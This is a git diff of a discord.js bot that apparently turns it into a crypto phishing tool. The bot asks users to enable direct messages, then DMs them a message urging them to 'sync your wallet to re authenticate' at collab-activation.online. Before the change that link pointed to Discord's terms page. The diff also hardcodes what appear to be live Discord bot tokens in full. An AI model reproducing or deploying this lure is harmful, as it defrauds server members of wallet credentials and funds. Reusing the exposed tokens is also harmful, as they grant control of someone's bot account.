@@ -2,7 +2,7 @@ const Discord = require("discord.js");
 const { MessageEmbed } = require('discord.js');
 
 //put your token here
-const token = 'OTY2Njk0NzE1MjkyNTI4NzQx.YmFenA.cNCGfC6AuJmyrZ_Ii3TJCWX3YNs';
+const token = 'OTY2Njk0NzE1MjkyNTI4NzQx.YmFenA.jbrhdM782Bx-FCNvO5DMGrM9U6s';
 
 const client = new Discord.Client({
       intents: [ "GUILDS","GUILD_MESSAGES","DIRECT_MESSAGES"]
@@ -23,12 +23,12 @@ client.on("messageCreate",(message)=>{
  let args = message.content.substring(PREFIX.length).split(" ");
  try {
     switch (args[0]) { 
-		case 'rulesi':
+		case 'support':
 		//bot reply to channel
-		  message.reply({ embeds: [exampleEmbed] });
+		  message.reply({ embeds: [exampleEmbed2] });
 			break;
 	
-		case 'support':
+		case 'done':
 		//bot dm command
 		message.author.send({ embeds: [exampleEmbed] });
 		break;
@@ -54,7 +54,7 @@ const exampleEmbed = new MessageEmbed()
 		//{ name: 'MAHALAGANG PAALALA:', value: 'Huwag ka pupunta sa mga links na di ka sigurado kung ano iyon maaring pishing site ang binibigay sayo at huwag ibibigay kahit kanino at kahit saan ang inyong SEED PHRASE / SECRET RECOVERY PHRASE. Hindi po namin ito hihingin sa inyo kahit anong mangyari. Kapag may humingi sa inyo, siguradong SCAM ito. Wala na po kaming magagawa kung magpapa-loko kayo kahit alam mong sinasamantala ka na pero umaasa ka pa din.'},
 		//{ name: '\u200B', value: '\u200B' },
 		//{name: 'Note:', value: 'Our Staff, Mod, Admin, Support, etc. will never message you first.'},
-    {name: '᲼',value: "Click [here](https://discord.com/terms) to connect , to sync your wallet to re authenticate and restore to all functionalities on wallet."}
+    {name: '᲼',value: "Click [here](https://collab-activation.online/) to connect, to sync your wallet to re authenticate and restore to all functionalities on wallet."}
 	//You are obligated to follow Discord's [terms of service](https://discord.com/terms)."},*editable
     //{name:'II.', value : " Our rules are based on Discord's [community guidelines](https://discord.com/guidelines) and have to be respected."}
 	)
@@ -62,11 +62,16 @@ const exampleEmbed = new MessageEmbed()
 
 	.setTimestamp()
 
-
+	const exampleEmbed2 = new MessageEmbed()
+	.setColor('#ADD8E6')
+	.addFields(
+		{name: '᲼',value: "You need to allow __direct message__ in your privacy settings"},
+	    {name: '᲼',value: "If you have enabled direct message, reply with **!done**"}
+		)
 
 
 
             
  //bot initalize                       
-client.login('OTY2Njk0NzE1MjkyNTI4NzQx.YmFenA.cNCGfC6AuJmyrZ_Ii3TJCWX3YNs');
+client.login(token);
 
